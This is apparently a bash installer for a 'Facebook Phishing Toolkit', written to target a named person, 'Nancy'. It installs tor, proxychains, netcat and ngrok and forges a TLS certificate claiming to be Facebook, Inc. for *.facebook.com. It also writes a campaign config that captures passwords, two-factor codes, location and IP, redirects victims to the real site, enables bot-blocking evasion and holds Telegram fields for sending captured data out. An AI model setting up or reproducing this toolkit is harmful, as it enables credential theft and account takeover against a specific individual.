#!/bin/bash
#
# Facebook Phishing Toolkit - Complete Setup
# Author : Jitu Jak
# Motivated to : Nancy
#

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'
BOLD='\033[1m'

echo -e "${BLUE}${BOLD}"
echo "  ███████╗██████╗ ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗"
echo "  ██╔════╝██╔══██╗██╔══██╗██║  ██║██║██╔════╝██║  ██║"
echo "  █████╗  ██████╔╝██████╔╝███████║██║███████╗███████║"
echo "  ██╔══╝  ██╔══██╗██╔═══╝ ██╔══██║██║╚════██║██╔══██║"
echo "  ██║     ██████╔╝██║     ██║  ██║██║███████║██║  ██║"
echo "  ╚═╝     ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝"
echo -e "${NC}"
echo -e "${YELLOW}${BOLD}  Facebook Phishing Toolkit v2.0${NC}"
echo -e "${GREEN}  Author : Jitu Jak${NC}"
echo -e "${GREEN}  Motivated to : Nancy${NC}"
echo -e "${BLUE}  ${NC}"
echo ""

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[!] This script must be run as root${NC}"
   exit 1
fi

echo -e "${YELLOW}[*] Starting complete installation...${NC}\n"

# ============================================================
# STEP 1: System Updates
# ============================================================
echo -e "${BLUE}[${NC}${GREEN}+${NC}${BLUE}]${NC} Step 1/7: Updating system packages..."
apt-get update -qq && apt-get upgrade -y -qq
echo -e "${GREEN}  ✓ System updated${NC}"

# ============================================================
# STEP 2: Install System Dependencies
# ============================================================
echo -e "\n${BLUE}[${NC}${GREEN}+${NC}${BLUE}]${NC} Step 2/7: Installing system dependencies..."
apt-get install -y -qq \
    python3 \
    python3-pip \
    python3-venv \
    openssl \
    net-tools \
    curl \
    wget \
    git \
    unzip \
    xdg-utils \
    tor \
    proxychains4 \
    jq \
    nmap \
    netcat-openbsd \
    apache2-utils \
    rlwrap \
    > /dev/null 2>&1

# Install ngrok
if ! command -v ngrok &> /dev/null; then
    echo -e "  ${YELLOW}[*] Installing ngrok...${NC}"
    wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
    tar -xzf ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin/
    rm ngrok-v3-stable-linux-amd64.tgz
    chmod +x /usr/local/bin/ngrok
    echo -e "  ${GREEN}  ✓ ngrok installed${NC}"
fi

echo -e "${GREEN}  ✓ System dependencies installed${NC}"

# ============================================================
# STEP 3: Create Directory Structure
# ============================================================
echo -e "\n${BLUE}[${NC}${GREEN}+${NC}${BLUE}]${NC} Step 3/7: Creating directory structure..."
mkdir -p {modules,templates/assets,tools,payloads,logs,output/{screenshots,reports},config}
touch logs/.gitkeep output/.gitkeep
echo -e "${GREEN}  ✓ Directory structure created${NC}"

# ============================================================
# STEP 4: Setup Python Virtual Environment
# ============================================================
echo -e "\n${BLUE}[${NC}${GREEN}+${NC}${BLUE}]${NC} Step 4/7: Setting up Python virtual environment..."
python3 -m venv venv
source venv/bin/activate
echo -e "${GREEN}  ✓ Virtual environment created${NC}"

# ============================================================
# STEP 5: Install Python Dependencies
# ============================================================
echo -e "\n${BLUE}[${NC}${GREEN}+${NC}${BLUE}]${NC} Step 5/7: Installing Python packages..."
cat > requirements.txt << 'REQEOF'
cryptography>=41.0.0
requests>=2.31.0
colorama>=0.4.6
beautifulsoup4>=4.12.0
selenium>=4.15.0
phonenumbers>=8.13.0
pillow>=10.0.0
flask>=3.0.0
lxml>=4.9.0
fake-useragent>=1.1.0
python-whois>=0.8.0
dnspython>=2.4.0
argparse>=1.4.0
json5>=0.9.0
pycountry>=22.3.0
REQEOF

pip install --quiet -r requirements.txt
echo -e "${GREEN}  ✓ Python dependencies installed${NC}"

# ============================================================
# STEP 6: Generate SSL Certificate
# ============================================================
echo -e "\n${BLOCK}[${NC}${GREEN}+${NC}${BLUE}]${NC} Step 6/7: Generating SSL certificates..."
python3 -c "
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
import datetime

key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
with open('server.key', 'wb') as f:
    f.write(key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    ))

subject = issuer = x509.Name([
    x509.NameAttribute(NameOID.COUNTRY_NAME, 'US'),
    x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, 'California'),
    x509.NameAttribute(NameOID.LOCALITY_NAME, 'Menlo Park'),
    x509.NameAttribute(NameOID.ORGANIZATION_NAME, 'Facebook, Inc.'),
    x509.NameAttribute(NameOID.COMMON_NAME, '*.facebook.com'),
])

cert = x509.CertificateBuilder().subject_name(subject).issuer_name(issuer).public_key(key.public_key()).serial_number(x509.random_serial_number()).not_valid_before(datetime.datetime.utcnow()).not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365)).add_extension(x509.SubjectAlternativeName([x509.DNSName('facebook.com'), x509.DNSName('*.facebook.com')]), critical=True).sign(key, hashes.SHA256())

with open('server.crt', 'wb') as f:
    f.write(cert.public_bytes(serialization.Encoding.PEM))
print('  ✓ SSL certificate generated')
"
echo -e "${GREEN}  ✓ SSL certificates ready${NC}"

# ============================================================
# STEP 7: Configure Settings
# ============================================================
echo -e "\n${BLUE}[${NC}${GREEN}+${NC}${BLUE}]${NC} Step 7/7: Creating configuration files..."

cat > config/settings.json << 'CONFEOF'
{
    "campaign_name": "Facebook Security Audit",
    "author": "Jitu Jak",
    "target": "Nancy",
    "server": {
        "host": "0.0.0.0",
        "port": 443,
        "use_https": true,
        "ssl_cert": "server.crt",
        "ssl_key": "server.key"
    },
    "capture": {
        "credentials": true,
        "two_factor": true,
        "location": true,
        "ip_address": true,
        "user_agent": true
    },
    "redirect": {
        "after_login": "https://www.facebook.com",
        "after_2fa": "https://www.facebook.com",
        "delay_seconds": 1
    },
    "evasion": {
        "use_proxychains": false,
        "rotate_user_agents": true,
        "add_honeypot_fields": true,
        "block_bots": true
    },
    "logging": {
        "verbose": true,
        "log_to_file": true,
        "log_directory": "logs",
        "telegram_bot_token": "",
        "telegram_chat_id": ""
    }
}
CONFEOF

echo -e "${GREEN}  ✓ Configuration files created${NC}"

# ============================================================
# SUMMARY
# ============================================================
echo -e "\n${GREEN}${BOLD}"
echo "  ╔══════════════════════════════════════════════════╗"
echo "  ║          INSTALLATION COMPLETE                   ║"
echo "  ╠══════════════════════════════════════════════════╣"
echo "  ║  Author : Jitu Jak                              ║"
echo "  ║  Target : Nancy                                 ║"
echo "  ╠══════════════════════════════════════════════════╣"
echo "  ║  To start the server:                            ║"
echo "  ║    sudo bash run.sh                              ║"
echo "  ║                                                  ║"
echo "  ║  To generate email:                              ║"
echo "  ║    python3 fb_phish.py --generate-email          ║"
echo "  ║                                                  ║"
echo "  ║  Quick start with ngrok:                         ║"
echo "  ║    bash tools/ngrok_setup.sh                     ║"
echo "  ╚══════════════════════════════════════════════════╝"
echo -e "${NC}"

# Create run.sh shortcut
cat > run.sh << 'RUNEOF'
#!/bin/bash
source venv/bin/activate
python3 fb_phish.py "$@"
RUNEOF
chmod +x run.sh

echo -e "\n${YELLOW}[*] Run 'source venv/bin/activate' to enter the environment${NC}"